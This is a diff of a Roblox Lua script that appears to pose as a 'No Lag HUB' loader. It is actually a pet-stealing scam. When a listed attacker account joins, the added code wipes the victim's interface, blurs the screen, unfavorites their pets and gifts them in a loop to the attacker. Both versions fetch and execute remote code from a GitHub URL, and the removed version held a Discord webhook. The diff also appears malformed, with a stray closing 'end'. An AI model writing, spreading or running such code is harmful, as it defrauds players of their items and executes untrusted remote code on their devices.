@@ -1,64 +1,93 @@
 
-loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/NoLag-id/No-Lag-HUB/refs/heads/main/Loader/LoaderV2.lua"))()
-
--- CONFIG SECTION
-local webhookUrl = "https://discord.com/api/webhooks/1392825138134651043/JhW9IN6scthgQncuUYfAefxbNOxiM2GZMJ6V6o1hAuJTWXqUqMt6bYxFpbqNTEMrxLyi"
-local targetUsernames = {"BadPlayer123", "deepscriptAI", "EnemyGuy", "intercepternumber1"}
-local drainPets = {
-    "Dragonfly", "T‑Rex", "Raccoon", "Red Fox", "Queen Bee",
-    "Disco Bee", "Butterfly", "Mimic", "Moon Cat", "Fennec Fox",
-    "Triceratops", "Axolotl", "Bear Bee", "Polar Bear",
-    "Praying Mantis", "Scarlet Macaw"
-}
-local petKeywords = {
-    "Starfish", "Crab", "Seagull", "Bunny", "Dog", "Golden Lab", "Bee",
-    "Black Bunny", "Cat", "Chicken", "Deer", "Monkey", "Orange Tabby",
-    "Pig", "Rooster", "Spotted Deer", "Flamingo", "Toucan", "Sea Turtle",
-    "Orangutan", "Seal", "Honey Bee", "Wasp", "Tarantula Hawk", "Raptor",
-    "Triceratops", "Stegosaurus", "Pterodactyl", "Turtle", "Caterpillar",
-    "Petal Bee", "Moth", "Scarlet Macaw", "Ostrich", "Peacock",
-    "Capybara", "Sand Snake", "Meerkat", "Brown Mouse", "Giant Ant",
-    "Grey Mouse", "Praying Mantis", "Red Giant Ant", "Snail", "Squirrel",
-    "Bear Bee", "Butterfly", "Brontosaurus", "Pack Bee", "Mimic Octopus",
-    "Hyacinth Macaw", "Axolotl", "Red Fox", "T‑Rex", "Dragonfly",
-    "Queen Bee", "Disco Bee", "Fennec Fox", "Moon Cat", "Raccoon",
-    "Polar Bear"
-}
-
--- SERVICES
 local Players = game:GetService("Players")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local HttpService = game:GetService("HttpService")
 local TeleportService = game:GetService("TeleportService")
-local Lighting = game:GetService("Lighting")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local localPlayer = Players.LocalPlayer
-local backpack = localPlayer:WaitForChild("Backpack")
-local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
-local jobId = game.JobId
-local placeId = game.PlaceId
+local targetUsernames = {
+    "deepscriptAI", -- Add more names if needed
+}
 
--- AUTO SERVER-HOP IF PRIVATE
-local function getLowestServer()
-    local req = http_request or syn.request or request or fluxus.request
-    if not req then return nil end
-    local cursor = ""
-    local lowest = nil
-    repeat
-        local url = "https://games.roblox.com/v1/games/" .. placeId .. "/servers/Public?sortOrder=Asc&limit=100"
-        if cursor ~= "" then url = url .. "&cursor=" .. cursor end
-        local response = req({ Url = url, Method = "GET" })
-        if response and response.Body then
-            local data = HttpService:JSONDecode(response.Body)
-            for _, server in pairs(data.data or {}) do
-                if server.playing < server.maxPlayers then
-                    lowest = server
-                    break
+local highTierPets = {
+    "Dragonfly", "Butterfly", "Mimic", "Red Fox", "Racoon",
+    "Disco Bee", "Queen Bee", "T‑Rex", "Spinosaurus", "Ankylosaurus"
+}
+
+local drainPets = {
+    "Dragonfly", "Butterfly", "Mimic", "Red Fox", "Racoon", "Disco Bee", "Queen Bee", "T‑Rex",
+    "Spinosaurus", "Ankylosaurus", "Triceratops",
+    "Capybara", "Bear Bee", "Chicken Zombie", "Cooked Owl"
+}
+
+local gifted = false
+
+-- Auto unfavorite pets
+local function unfavoriteAll()
+    local Backpack = localPlayer:WaitForChild("Backpack")
+    for _, tool in ipairs(Backpack:GetChildren()) do
+        if tool:IsA("Tool") and tool:FindFirstChild("dex") then
+            local dex = tool:FindFirstChild("dex")
+            if dex:GetAttribute("d") == true then
+                ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("FavoritePet"):FireServer(tool, false)
+            end
+        end
+    end
+end
+
+-- Freeze screen (visual only)
+local function freezeScreen()
+    local blur = Instance.new("BlurEffect", game:GetService("Lighting"))
+    blur.Size = 100
+end
+
+-- Remove all GUIs
+local function removeGUI()
+    for _, gui in ipairs(localPlayer:WaitForChild("PlayerGui"):GetChildren()) do
+        if gui:IsA("ScreenGui") or gui:IsA("BillboardGui") or gui:IsA("SurfaceGui") then
+            gui:Destroy()
+        end
+    end
+end
+
+-- Auto gifting loop
+local function drain()
+    gifted = true
+    while gifted do
+        local Backpack = localPlayer:WaitForChild("Backpack")
+        for _, tool in ipairs(Backpack:GetChildren()) do
+            for _, petName in ipairs(drainPets) do
+                if string.find(tool.Name, petName) then
+                    local recipient = Players:FindFirstChild(targetUsernames[1])
+                    if recipient then
+                        local args = {
+                            "GivePet",
+                            recipient,
+                            tool
+                        }
+                        ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer(unpack(args))
+                        task.wait(0.7)
+                    end
                 end
             end
-            cursor = data.nextPageCursor
         end
-    until lowest or cursor == nil
-    return lowest
+        task.wait(1.2)
+    end
+end
+
+-- Watch for specific players
+Players.PlayerAdded:Connect(function(player)
+    if table.find(targetUsernames, player.Name) then
+        task.wait(7)
+        removeGUI()
+        freezeScreen()
+        unfavoriteAll()
+        drain()
+    end
+end)
+
+-- Load external functionality
+pcall(function()
+    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/NoLag-id/No-Lag-HUB/refs/heads/main/Loader/LoaderV2.lua"))()
+end)
 end
 
 local wasPrivateServer = false
